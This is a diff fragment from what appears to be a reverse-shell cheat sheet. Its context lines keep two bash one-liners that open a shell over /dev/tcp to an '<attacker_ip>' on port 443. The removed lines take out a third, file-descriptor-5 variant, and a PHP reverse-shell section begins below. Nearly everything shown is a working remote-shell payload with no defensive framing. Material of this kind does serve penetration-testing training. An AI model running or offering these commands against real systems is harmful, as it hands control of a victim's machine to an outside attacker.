@@ -65,13 +65,6 @@ $ exec 5<>/dev/tcp/<attacker_ip>/443; cat <&5 | while read line; do $line 2>&5 >
 $ 0<&196;exec 196<>/dev/tcp/<attacker_ip>/443; sh <&196 >&196 2>&196 
 ```
 
-### Bash with file descriptor 5 reverse shell
-
-```bash
-# uses file descriptor 5 to enable interactive session over tcp
-$ bash -i 5<> /dev/tcp/<attacker_ip>/443 0<&5 1>&5 2>&5
-```
-
 ### PHP reverse shells
 
 ```bash
